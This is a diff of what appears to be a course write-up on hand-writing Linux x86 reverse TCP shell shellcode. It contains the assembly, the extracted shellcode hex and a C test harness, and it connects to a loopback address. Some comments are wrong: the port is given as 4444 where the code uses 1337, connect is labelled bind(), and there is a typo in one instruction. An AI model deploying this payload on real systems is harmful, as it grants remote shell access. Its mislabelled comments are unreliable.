@@ -102,19 +102,19 @@ EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2]
 
 #### Assembly Code for the address struct & function bind().
 ```nasm 
-xor eax, eax
+xor eax, eax     ; Clears the eax register
 inc ebx
-push 0x0101017f    ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
-push word 0x3905   ; ARG[1]. This is for the TCP Port 1337.
-push bx	           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
-mov ecx, esp       ; Point ECX to the top of the stack. This will be used for ECX[1].
-push 0x10          ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
-push ecx           ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
-push esi           ; ECX[0] - int sockfd // Saved in ESI earlier after creating the socket.	
-mov ecx, esp       ; Stack is all loaded. We now need to point ECX to the top of the Stack.
-inc ebx            ; Connect() value for the socketcall() SYSCAL
-mov al, 0x66       ; socketcall() system call
-int 0x80           ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
+push 0x0101017f  ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
+push word 0x3905 ; ARG[1]. This is for the TCP Port 1337.
+push bx	         ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
+mov ecx, esp     ; Point ECX to the top of the stack. This will be used for ECX[1].
+push 0x10        ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
+push ecx         ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
+push esi         ; ECX[0] - int sockfd // Saved in ESI earlier after creating the socket.	
+mov ecx, esp     ; Stack is all loaded. We now need to point ECX to the top of the Stack.
+inc ebx          ; Connect() value for the socketcall() SYSCAL
+mov al, 0x66     ; socketcall() system call
+int 0x80         ; System Call Interrupt 0x80 - Executes bind(). 
 ```
 ### 4. Duplicate STDIN, STDOUT, STDERR to the remote Socket. 
 #### C Function
@@ -182,9 +182,9 @@ mov al, 0x66      ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
 xor ebx, ebx      ; Clear EBX Register. EBX = 0x00000000
 inc ebx	          ; EBX = 0x1 = socket() // Create a socket
 xor ecx, ecx      ; Clear ECX Register. ECX = 0x00000000
-push ecx          ; ECX[2] = int protocol = 0. Pushes 0x0 onto the stack
-push ebxi         ; ECX[1] - int type = SOCK_STREAM = 0x1. Pushes 0x1 onto the stack
-push byte 0x2     ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. Pushes 0x2 onto the stack
+push ecx          ; ECX[2] = int protocol = 0. 
+push ebxi         ; ECX[1] - int type = SOCK_STREAM = 0x1. 
+push byte 0x2     ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. 
 mov ecx, esp      ; Point the ECX Register to the Top of the stack
 int 0x80          ; Execute the socket() System Call
 
@@ -195,16 +195,17 @@ inc ebx
 push 0x0101017f   ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
 push word 0x3905  ; ARG[1]. This is for the TCP Port 4444.
 push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
-mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
+mov ecx, esp      ; Now all that is left is to point ECX to the top of the 
+                  ;  loaded stack and let it do it's thing.
 
 push 0x10         ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
 push ecx          ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
-push esi          ; ECX[0] - int sockfd // Saved in ESI earlier after creating the socket.	
+push esi          ; ECX[0] - int sockfd. Saved in ESI earlier after creating the socket.	
 
-mov ecx, esp      ; Stack is all loaded. We now need to point ECX to the top of the Stack.
+mov ecx, esp      ; Stack is loaded. We now need to point ECX to the top of the Stack.
 inc ebx	          ; Connect() value for the socketcall() SYSCAL
 mov al, 0x66      ; socketcall() system call
-int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
+int 0x80          ; System Call Interrupt 0x80 - Executes bind(). 
 xchg ebx, esi
 
 xor ecx, ecx
@@ -249,17 +250,25 @@ uid=0(root) gid=0(root) groups=0(root)
 ### Extracting the Shellcode Hex from the compiled binary
 ```console
 ./objdump2hex.sh revTcpSh
-"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
+"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
+"\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68"
+"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
+"\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
+"\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+"\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
 ```
 ### Adding the shellcode to another program
 This is the C program we will use to see if our shellcode works while ran in a different host program. After modifying our program, we will compile it. 
 ```c
 #include<stdio.h>
 #include<string.h>
-
 unsigned char code[] = \
-"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
-
+"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
+"\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68"
+"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
+"\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
+"\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+"\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
 main()
 {
         printf("Shellcode Length:  %d\n", strlen(code));
